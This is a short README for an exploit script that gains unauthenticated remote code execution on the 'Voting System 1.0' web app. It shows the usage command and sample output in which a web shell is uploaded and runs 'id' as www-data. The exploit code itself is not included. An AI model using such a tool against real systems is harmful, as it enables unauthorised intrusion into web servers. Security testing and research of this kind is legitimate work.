# Voting System 1.0 - Remote Code Execution (Unauthenticated)
RCE_Voting_System.py is a script to exploit the RCE in Voting System 1.0 web application

Source: https://www.exploit-db.com/exploits/49846

## Usage

This RCE is not authenticated, so you only need the website URL.

Usage: python3 RCE_Voting_System.py [url]
Exemple: python3 RCE_Voting_System.py http://192.168.1.50/votesystem/

Output exemple:  
florian@kali-floflo:/tmp/floflo$ python3 exploit.py http://192.168.1.50/votesystem/  
Voting System 1.0 - Remote Code Execution (Unauthenticated) - https://www.exploit-db.com/exploits/49846  
[+] Trying to upload a webshell...  
Upload OK!  
Web shell open. This is not a reverse shell  
www-data@website$ id  
uid=33(www-data) gid=33(www-data) groups=33(www-data)  

